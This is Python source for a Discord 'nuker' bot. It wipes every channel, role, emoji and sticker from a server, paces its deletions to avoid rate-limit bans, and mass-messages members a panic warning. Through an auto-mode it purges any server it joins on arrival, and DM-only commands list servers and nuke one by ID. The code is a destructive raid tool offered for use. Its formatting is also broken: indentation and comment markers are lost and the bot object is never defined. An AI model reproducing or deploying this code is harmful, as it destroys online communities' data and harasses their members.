import discord
from discord.ext import commands
import os
import asyncio
from dotenv import load_dotenv

Load environment variables

load_dotenv()

Bot setup with necessary intents

intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.members = True  # 🔥 Add this line

Auto-mode toggle

auto_mode = False

@bot.event
async def on_ready():
print(f'{bot.user} has connected to Discord!')

@bot.event
async def on_guild_join(guild):
"""Auto-purge when joining a server if auto mode is enabled"""
if auto_mode:
# Find the bot owner or first user with admin perms
owner = bot.get_user(bot.owner_id) if bot.owner_id else None
if not owner:
# Find first admin in the server
for member in guild.members:
if member.guild_permissions.administrator and not member.bot:
owner = member
break

await purge_server(guild, owner)

async def purge_server(guild, notify_user=None):
"""Purge all channels, roles, emojis, and stickers from a server"""

# Count items  
channel_count = len(guild.channels)  
role_count = len([r for r in guild.roles if r.name != "@everyone" and not r.managed])  
emoji_count = len(guild.emojis)  
sticker_count = len(guild.stickers)  
  
# DM warning to all members except those under bot's role  
try:  
    # Find first text channel to create invite  
    text_channel = None  
    for channel in guild.channels:  
        if isinstance(channel, discord.TextChannel):  
            text_channel = channel  
            break  
      
    # Create invite link  
    invite_link = "No invite available"  
    if text_channel:  
        try:  
            invite = await text_channel.create_invite(max_age=0, max_uses=0)  
            invite_link = invite.url  
        except:  
            pass  
      
    # Get bot's highest role position  
    bot_member = guild.me  
    bot_role_position = bot_member.top_role.position if bot_member else 0  
      
    # DM all members except those with roles higher than bot  
    warning_msg = f"🚨 **LEAVE THIS SERVER** 🚨\n\n**Backup invite:** {invite_link}\n\n**THIS SERVER IS:** Compromised, Corrupted, Under Attack, Being Purged, Unsafe, Hijacked, Destroyed"  
      
    dm_count = 0  
    for member in guild.members:  
        try:  
            # Skip bots and members with roles higher than bot  
            if member.bot:  
                continue  
              
            member_role_position = member.top_role.position if member.top_role else 0  
            if member_role_position >= bot_role_position:  
                continue  
              
            # Send DM  
            await member.send(warning_msg)  
            dm_count += 1  
            await asyncio.sleep(0.5)  # Rate limit for DMs  
              
        except:  
            pass  # Skip if can't DM  
      
    # Small delay before starting destruction  
    await asyncio.sleep(2)  
      
except:  
    pass  
  
async def safe_delete(item, delay=1.5):  
    """Safely delete an item with conservative rate limit handling"""  
    try:  
        await item.delete()  
        await asyncio.sleep(delay)  
    except discord.HTTPException as e:  
        if e.status == 429:  # Rate limited  
            retry_after = float(e.response.headers.get('Retry-After', 5))  
            await asyncio.sleep(retry_after + 2)  
            try:  
                await item.delete()  
                await asyncio.sleep(delay)  
            except:  
                pass  
    except:  
        pass  
  
# Delete channels first (most permissive)  
channels = guild.channels.copy()  
for channel in channels:  
    await safe_delete(channel, 1.2)  
  
# Long break before roles (they have harsh limits)  
await asyncio.sleep(5)  
  
# Delete roles very slowly (they have 24h ban potential)  
roles = guild.roles.copy()  
for role in roles:  
    if role.name != "@everyone" and not role.managed:  
        await safe_delete(role, 2.0)  # 2 second delay for roles  
  
# Long break before emojis (they have special limits)  
await asyncio.sleep(5)  
  
# Delete emojis slowly  
emojis = guild.emojis.copy()  
for emoji in emojis:  
    await safe_delete(emoji, 1.5)  
  
# Break before stickers  
await asyncio.sleep(3)  
  
# Delete stickers  
stickers = guild.stickers.copy()  
for sticker in stickers:  
    await safe_delete(sticker, 1.5)  
  
# Send notification if user provided  
if notify_user:  
    try:  
        await notify_user.send(f"Nuked {guild.name}: {channel_count} channels, {role_count} roles, {emoji_count} emojis, {sticker_count} stickers | DMed {dm_count} members")  
    except:  
        pass

@bot.command(name='c')
async def purge_by_id(ctx, server_id: int = None):
"""Purge server by ID (DM only)"""

# Check if command is used in DM  
if ctx.guild is not None:  
    return  
  
if server_id is None:  
    await ctx.send("Need server ID.")  
    return  
  
guild = bot.get_guild(server_id)  
if guild is None:  
    await ctx.send("Server not found.")  
    return  
  
# Check if user has admin perms in that server  
member = guild.get_member(ctx.author.id)  
if member is None or not member.guild_permissions.administrator:  
    await ctx.send("No perms in that server.")  
    return  
  
await purge_server(guild, ctx.author)  
await ctx.send("Done.")

@bot.command(name='autoturn')
async def toggle_auto(ctx, mode: str = None):
"""Toggle auto-purge mode (DM only)"""
global auto_mode

# Check if command is used in DM  
if ctx.guild is not None:  
    return  
  
if mode is None:  
    await ctx.send(f"Auto mode: {'on' if auto_mode else 'off'}")  
    return  
  
if mode.lower() == "on":  
    auto_mode = True  
    await ctx.send("Auto mode on.")  
elif mode.lower() == "off":  
    auto_mode = False  
    await ctx.send("Auto mode off.")  
else:  
    await ctx.send("Use 'on' or 'off'.")

@bot.command(name='servers')
async def list_servers(ctx):
"""List all servers the bot is in (DM only)"""

# Check if command is used in DM  
if ctx.guild is not None:  
    return  
  
servers = []  
for guild in bot.guilds:  
    member = guild.get_member(ctx.author.id)  
    has_perms = member is not None and member.guild_permissions.administrator  
    servers.append(f"{guild.name} ({guild.id}) {'✓' if has_perms else '✗'}")  
  
if servers:  
    await ctx.send("Servers:\n" + "\n".join(servers))  
else:  
    await ctx.send("No servers.")

Run the bot

if name == "main":
TOKEN = os.getenv('DISCORD_TOKEN')
if TOKEN:
bot.run(TOKEN)
else:
print("No token found.")


